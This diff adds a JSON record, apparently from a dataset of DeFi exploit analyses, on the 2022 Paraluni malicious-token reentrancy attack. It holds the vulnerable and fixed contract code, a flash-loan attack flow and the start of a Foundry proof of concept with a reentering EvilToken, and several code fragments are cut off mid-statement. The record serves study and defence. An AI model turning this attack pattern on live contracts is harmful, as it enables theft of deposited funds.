@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-03-13_Paraluni_ReentrancyDepositLP",
+ "source_file": "2022/2022-03-13_Paraluni_ReentrancyDepositLP.md",
+ "title": "Paraluni — Malicious Token Reentrancy LP Deposit Exploit Analysis",
+ "date": "2022-03-13",
+ "protocol": "Paraluni",
+ "chain": "BSC",
+ "loss_raw": "~$1,700,000 (USDT, BUSD)",
+ "loss_usd": 1700000.0,
+ "root_cause": "During `depositByAddLiquidity()`'s use of externally supplied tokens to create a Pancake LP, the malicious token's transfer hook allowed reentrancy, enabling duplicate withdrawal via `withdrawAndRemoveLiquidity()`",
+ "attack_tx": null,
+ "vulnerable_contract": "MasterChef 0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable MasterChef.depositByAddLiquidity() (pseudocode)\ncontract MasterChef {\n\n    function depositByAddLiquidity(\n        uint256 _pid,\n        address[2] memory _tokens,\n        uint256[2] memory _amounts\n    ) external {\n        //",
+  "❌ Reentrancy possible when malicious token is transferred\n        // EvilToken.transfer() calls withdrawAndRemoveLiquidity()\n        IERC20(_tokens[0]).transferFrom(msg.sender, address(this), _amounts[0]);\n        IERC20(_tokens[1]).transferFrom(msg.sender, address(this), _amounts[1]);\n\n        // Create LP token and stake\n        _addLiquidityAndStake(_pid, _tokens, _amounts);\n\n        //",
+  "❌ State update occurs after external call\n        userInfo[_pid][msg.sender].amount += lpAmount;\n    }\n\n    //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract MasterChefFixed {\n    bool private locked;\n\n    modifier nonReentrant() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function depositByAddLiquidity(...) external nonReentrant {\n        //",
+  "✅ CEI: update state first\n        userInfo[_pid][msg.sender].amount += lpAmount; // expected LP amount\n        // external calls after\n        IERC20(_tokens[0]).transferFrom(msg.sender, address(this), _amounts[0]);\n        // ...\n    }\n}"
+ ],
+ "steps": [
+  "[5] withdrawChange() → withdraw additional tokens",
+  "[6] token1.redeem() → recover remaining assets"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Deploy EvilToken (with reentrancy code inside transfer)\n    │\n    ├─[2] Flash loan: borrow 10,000 USDT and 10,000 BUSD\n    │       pair.swap(10_000e18, 10_000e18, ...)\n    │\n    ├─[3] [Flash loan callback]\n    │       Instantiate EvilToken(token0), EvilToken(token1)\n    │\n    ├─[4] Call MasterChef.depositByAddLiquidity()\n    │       _tokens = [EvilToken, existing_LP]\n    │       _amounts = [...]\n    │       ↓\n    │   EvilToken.transferFrom() executes\n    │       ↓ Hook fires inside EvilToken.transfer()\n    │           │\n    │           └─ [Reentrancy] MasterChef.withdrawAndRemoveLiquidity()\n    │                   Withdraw attacker's existing LP (before balance deduction)\n    │                   Receive USDT/BUSD\n    │\n    ├─[5] withdrawChange() → withdraw addition",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IMasterChef {\n    function depositByAddLiquidity(\n        uint256 pid,\n        address[2] memory tokens,\n        uint256[2] memory amounts\n    ) external;\n    function withdrawAndRemoveLiquidity(uint256 pid, uint256 amount) external;\n    function withdrawChange(uint256 pid) external;\n}\n\n// ⚡ Malicious token: contains reentrancy code inside transfer\ncontract EvilToken {\n    IMasterChef masterChef;\n    uint256 pid;\n    bool attacking = false;\n\n    constructor(address _masterChef, uint256 _pid) {\n        masterChef = IMasterChef(_masterChef);\n        pid = _pid;\n    }\n\n    function transfer(address, uint256) external returns (bool) {\n        if (!attacking) {\n            attacking = true;\n "
+ ]
+}
